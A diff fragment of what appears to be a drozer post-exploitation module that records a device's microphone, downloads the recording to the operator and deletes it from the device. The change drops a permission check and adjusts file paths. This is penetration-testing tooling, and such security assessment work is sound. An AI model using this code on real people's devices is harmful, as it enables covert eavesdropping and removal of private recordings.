@@ -24,12 +24,6 @@ dz> run post.capture.microphone /home/user/Desktop/test.3gp
 
     def execute(self, arguments):
         
-        # Check that the agent has the RECORD_AUDIO permission
-        packageManager = self.getContext().getPackageManager()
-        if not packageManager.checkPermission("android.permission.RECORD_AUDIO", self.getContext().getPackageName()) == packageManager.PERMISSION_GRANTED:
-            self.stdout.write("[-] This agent does not have the RECORD_AUDIO permission. Exiting...\n")
-            return
-        
         # Check that destination ends in 3gp
         if not arguments.destination.upper().endswith(".3GP"):
             self.stdout.write("[-] Destination file must have a .3gp extension. Exiting...\n")
@@ -45,7 +39,7 @@ dz> run post.capture.microphone /home/user/Desktop/test.3gp
         recorder.setAudioSource(AudioSource.MIC)
         recorder.setOutputFormat(OutputFormat.THREE_GPP)
         recorder.setAudioEncoder(AudioEncoder.AMR_NB)
-        recorder.setOutputFile("/data/data/com.mwr.dz/recording.3gp")
+        recorder.setOutputFile("%s/recording.3gp" % self.workingDir())
         recorder.prepare()
         
         self.stdout.write("[+] Recording started\n")
@@ -57,13 +51,13 @@ dz> run post.capture.microphone /home/user/Desktop/test.3gp
         recorder.release()
         
         # Download
-        length = self.downloadFile("/data/data/com.mwr.dz/recording.3gp", arguments.destination)
+        length = self.downloadFile("%s/recording.3gp" % self.workingDir(), arguments.destination)
         
         if length != None:
             self.stdout.write("[+] Done.\n")
             
             # Remove recording from device
-            self.shellExec("rm /data/data/com.mwr.dz/recording.3gp")
+            self.shellExec("rm %s/recording.3gp" % self.workingDir())
         else:
             self.stderr.write("[-] Recording download failed.\n")
             
